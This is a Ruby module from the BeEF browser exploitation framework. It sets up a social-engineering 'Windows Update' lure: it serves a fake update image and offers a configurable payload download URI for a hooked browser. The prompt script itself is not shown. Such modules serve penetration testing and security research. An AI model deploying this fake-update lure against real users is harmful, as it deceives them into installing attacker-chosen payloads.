#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Windows_update < BeEF::Core::Command
  
  def pre_send
    
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/windows_update/img/windows_update.png', '/windows/update', 'png')
    
  end
  
  def self.options
    
    configuration = BeEF::Core::Configuration.instance
    
    proto = configuration.get("beef.http.https.enable") == true ? "https" : "http"
    
    image = "#{proto}://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/windows/update.png"

    return [
        {'name' =>'image', 'description' =>'Location of image for the update prompt', 'ui_label'=>'Image', 'value' => image},
        {'name' =>'payload_uri', 'description' =>'Custom Payload URI', 'ui_label'=>'Custom Payload URI','value' => "https://github.com/beefproject/beef/archive/master.zip"}
    ]
  end
  
  def post_execute
    
    content = {}
    content['result'] = @datastore['result']
    save content
    
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/windows/update.png')   
        
  end
  
end
